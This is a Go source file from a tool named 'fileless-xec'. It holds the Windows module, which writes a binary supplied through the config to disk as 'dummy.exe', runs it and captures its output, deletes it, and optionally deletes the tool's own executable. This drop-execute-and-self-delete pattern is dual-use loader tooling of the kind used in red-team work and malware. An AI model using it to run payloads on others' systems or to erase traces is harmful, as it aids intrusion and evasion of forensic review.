// +build windows

package execwindows

import (
	"fileless-xec/pkg/config"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
)

//Remove current file while its execution
func selfRemove() {
	err := os.Remove("./fileless-xec")
	if err != nil {
		fmt.Println(err)
	}
}

//UnstealthyExec file retrieve output. TODO: output in real-time + handle input
func UnstealthyExec(filename string, argv []string, envv []string) (err error) {
	defer os.Remove(filename) //with runtime.GOOS != "windows" we could remove earlier
	cmd := exec.Command("./" + filename)
	cmd.Args = argv
	cmd.Env = envv
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return err
	}

	if err := cmd.Start(); err != nil {
		return err
	}

	data, err := ioutil.ReadAll(stdout)

	if err != nil {
		return err
	}
	if err := cmd.Wait(); err != nil {
		return err
	}

	fmt.Println(string(data))
	return err
}

// Write Binary file on disk and chmod it to make it executable
func WriteBinaryFile(filename string, content string) (err error) {
	f, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = f.WriteString(content)
	if err != nil {
		return err
	}
	//Make file executable
	err = os.Chmod(filename, 0700)
	if err != nil {
		return err
	}
	return nil
}

//Exec a file witth filess-xec
func Filelessxec(cfg *config.Config) {
	//Unstealth mode
	binary := "dummy"

	binary += ".exe"

	//write binary file locally
	err := WriteBinaryFile(binary, cfg.BinaryContent)
	if err != nil {
		fmt.Println(err)
	}
	//execute it
	err = UnstealthyExec(binary, cfg.ArgsExec, cfg.Environ)
	fmt.Println(err)

	if cfg.SelfRm {
		selfRemove()
	}
}
